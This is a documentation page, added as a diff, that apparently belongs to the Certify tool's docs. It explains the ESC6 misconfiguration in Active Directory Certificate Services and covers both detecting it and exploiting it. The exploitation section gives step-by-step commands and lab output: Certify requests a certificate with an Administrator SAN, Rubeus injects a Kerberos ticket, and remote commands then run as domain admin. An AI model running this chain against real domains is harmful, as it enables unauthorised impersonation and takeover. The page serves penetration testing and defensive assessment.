@@ -1,0 +1,196 @@
+---
+title: 'ESC6 - Request Attribute SAN (EDITF_ATTRIBUTESUBJECTALTNAME2)'
+description: 'Exploit the EDITF_ATTRIBUTESUBJECTALTNAME2 CA setting to submit arbitrary Subject Alternative Names and impersonate users'
+icon: 'id-card'
+sidebarTitle: 'ESC6'
+---
+
+ESC6 is a misconfiguration in Active Directory Certificate Services (AD CS), which stems from overly permissive certificate authority settings. Specifically, if the `EDITF_ATTRIBUTESUBJECTALTNAME2` setting has been enabled on a CA, any certificate request will allow the requester to submit an arbitrary Subject Alternative Name (SAN) request attribute.
+
+<Info>
+Essentially, this enables the `Enrollee Supplies Subject` setting from [ESC1](./esc1-misconfigured-client-authentication) on every certificate template published by the CA.
+</Info>
+
+## Strong Certificate Mapping Considerations
+
+However, with the introduction of *Strong Certificate Mapping*, ESC6 is no longer enough to perform privilege escalation in a patched environment. This is because:
+
+<Accordion title="Strong Certificate Mapping Limitations">
+- The CA embeds a SID security extension matching the SID of the requesting user
+- The SAN specified with this vulnerability involves a special *request attribute* rather than allowing the requesting user to specify the subject details directly
+- Since the requesting user has no control over the rest of the subject details, it is unable to supply an arbitrary SID security extension
+</Accordion>
+
+<Warning>
+Despite this, it is still possible to abuse ESC6 if the SID security extension is omitted due to [ESC9](./esc9-security-extension-disabled-on-certificate-template) or [ESC16](./esc16-security-extension-disabled-on-certificate-authority). This is because the Subject Alternative Name (SAN) extension supports a URL-based format (`tag:microsoft.com,2022-09-14:sid:<sid>`), which contains a SID of its own, and therefore allows strong certificate mapping in the absence of a SID security extension.
+</Warning>
+
+## Detection
+
+We can search for certificate authorities with these vulnerabilities using the `enum-cas --filter-vulnerable` command from Certify. For more information about the command and its parameters, please refer to the [Command Overview](./1-command-overview) page.
+
+<CodeGroup>
+```bash Command
+Certify.exe enum-cas --filter-vulnerable --hide-admins
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Find certificate authorities
+[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
+[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.
+
+[*] Root CAs
+
+    ...
+
+[*] NTAuthCertificates - Certificates that enable authentication:
+
+    ...
+
+[*] Enterprise/enrollment certificate authorities:
+
+    Enterprise CA Name            : CORP-CA01-CA
+    DNS Hostname                  : ca01.corp.local
+    FullName                      : ca01.corp.local\CORP-CA01-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=CORP-CA01-CA, DC=corp, DC=local
+    Cert Thumbprint               : CFBDC6826AC074EF86BE7774F959A2FF5F322DDC
+    Cert Serial                   : 12D3E574A63DE7854A9E5A1F4CD56490
+    Cert Start Date               : 21/05/2025 12.13.47
+    Cert End Date                 : 21/05/2030 12.23.46
+    Cert Chain                    : CN=CORP-CA01-CA,DC=corp,DC=local
++   User Specifies SAN            : Enabled
+    RPC Request Encryption        : Enabled
+    Disabled Extensions           : <unknown> (1.3.6.1.4.1.311.25.2)
+    Vulnerabilities
++     ESC6                        : The CA allows enrollees to specify SANs.
+      ESC16                       : The CA has disabled the security extension.
+    CA Permissions
+      Owner: BUILTIN\Administrators             S-1-5-32-544
+
+      Access Rights                                     Principal
+      Allow  Enroll                                     NT AUTHORITY\Authenticated Users   S-1-5-11
+    Enrollment Agent Restrictions : None
+
+    Enabled Certificate Templates:
+        ...
+
+Certify completed in 00:00:00.4966358
+```
+</CodeGroup>
+
+## Exploitation
+
+If we can also identify a certificate template that is vulnerable to [ESC9](./esc9-security-extension-disabled-on-certificate-template) or identify [ESC16](./esc16-security-extension-disabled-on-certificate-authority) on the same certificate authority, we can request any certificate from the CA and include a Subject Alternative Name (SAN) for a target user that we want to impersonate (e.g. `Administrator`).
+
+This can be done using the `request` command from Certify. The SAN can be in either of the formats:
+- `UserPrincipalName` (`--upn`)
+- `DnsName` (`--dns`)
+- `Rfc822Name` (`--email`)
+
+<Info>
+The security identifier (SID) of the target user must also be supplied with the `--sid-url` parameter, which is automatically turned into a URL-based SAN string as previously described.
+</Info>
+
+<CodeGroup>
+```bash Command
+Certify.exe request --ca ca01.corp.local\CORP-CA01-CA --template User --upn Administrator --sid-url S-1-5-21-976219687-1556195986-4104514715-500
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Request a certificate
+
+[*] Current user context    : CORP\lowpriv
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : User
+[*] Subject                 : CN=lowpriv, OU=Users, OU=Corp, DC=corp, DC=local
+[*] Subject Alt Name(s)     : Administrator, tag:microsoft.com,2022-09-14:sid:S-1-5-21-976219687-1556195986-4104514715-500
+[*] Sid Extension           : S-1-5-21-976219687-1556195986-4104514715-500
+
+[*] Certificate Authority   : ca01.corp.local\CORP-CA01-CA
+[*] CA Response             : The certificate has been issued.
+[*] Request ID              : 1
+
+[*] Certificate (PFX)       :
+
+MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh...
+
+Certify completed in 00:00:03.7689651
+```
+</CodeGroup>
+
+When the certificate has been issued, it is printed to the console in a base64-encoded format. The format is supported by [Rubeus](/ghostpack-docs/Rubeus-mdx/overview) and can be used to authenticate as the target user with the [`asktgt`](/ghostpack-docs/Rubeus-mdx/commands/ticket-requests/asktgt#authentication-methods) command by setting the `/certificate:` parameter to the output certificate.
+
+<CodeGroup>
+```bash Command
+Rubeus.exe asktgt /user:Administrator /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh... /ptt
+```
+
+```diff Output
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=lowpriv, OU=Users, OU=Corp, DC=corp, DC=local
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'corp.local\Administrator'
+[*] Using domain controller: 10.10.10.10:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIGcjCCBm6gAwIBBaEDAgEWooIFfzCCBXthggV3MIIFc6ADAgEFoQ8bDU1FR0FLRUsuTE9DQUyiIjAg
+      ...
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/corp.local
+  ServiceRealm             :  CORP.LOCAL
+  UserName                 :  Administrator
+  UserRealm                :  CORP.LOCAL
+  StartTime                :  02/07/2025 11.07.37
+  EndTime                  :  02/07/2025 21.07.37
+  RenewTill                :  09/07/2025 11.07.37
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  fsIjncNqfhwgn2G5ixAolw==
+  ASREP (key)              :  67CA9CAE3051A4E05EB9CA2B9ED9309C
+```
+</CodeGroup>
+
+Since the `/ptt` parameter was supplied to [Rubeus](/ghostpack-docs/Rubeus-mdx/overview) when requesting the TGT, the ticket has been injected into the Kerberos ticket list, and we should be able to authenticate as the target user and access systems that the target user has access to.
+
+<CodeGroup>
+```powershell Command
+Invoke-Command -ComputerName DC01 -ScriptBlock {whoami}
+```
+
+```bash Output
+CORP\Administrator
+```
+</CodeGroup>
